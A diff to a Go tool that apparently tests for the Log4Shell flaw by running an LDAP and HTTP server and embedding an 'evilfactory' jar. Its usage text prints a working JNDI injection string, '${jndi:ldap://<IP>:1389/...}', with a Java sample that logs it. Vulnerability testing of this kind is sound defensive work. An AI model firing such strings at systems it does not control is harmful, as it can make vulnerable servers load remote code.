@@ -3,7 +3,9 @@ package main
 import (
 	"embed"
 	"fmt"
+	"github.com/logrusorgru/aurora"
 	"github.com/lor00x/goldap/message"
+	ldap "github.com/vjeantet/ldapserver"
 	"log"
 	"net"
 	"net/http"
@@ -13,8 +15,6 @@ import (
 	"strings"
 	"syscall"
 	"unsafe"
-
-	ldap "github.com/vjeantet/ldapserver"
 )
 
 //go:embed evilfactory-1.0-SNAPSHOT.jar
@@ -38,7 +38,7 @@ func printUsage() {
 	fmt.Println("Try to make log4j2 to print ${jndi:ldap://<IP>:1389/probably_not_vulnerable}")
 	fmt.Println("Example: ")
 	fmt.Println("----")
-	fmt.Println(`package info.jerrinot.log4shell.test;
+	fmt.Println(aurora.Blue(`package info.jerrinot.log4shell.test;
 
 import org.apache.logging.log4j.LogManager;
 
@@ -46,8 +46,9 @@ public class Main {
     public static void main(String[] args) throws Exception {
         LogManager.getLogger(Main.class).fatal("${jndi:ldap://172.17.0.2:1389/probably_not_vulnerable}");
     }
-}`)
+}`))
 	fmt.Println("----")
+	fmt.Printf("Running inside container: %t\n", isRunningInDockerContainer())
 }
 
 func startLdapServer() *ldap.Server {
@@ -73,10 +74,17 @@ func printIpAddresses() {
 	}
 	for _, addr := range addrs {
 		address := strings.Split(addr.String(), "/")[0]
-		if address != "127.0.0.1" {
+		if address != "127.0.0.1" && !strings.Contains(address, "::") {
 			fmt.Println(address)
 		}
 	}
+}
+
+func isRunningInDockerContainer() bool {
+	if _, err := os.Stat("/.dockerenv"); err == nil {
+		return true
+	}
+	return false
 }
 
 func startHttpServer() {
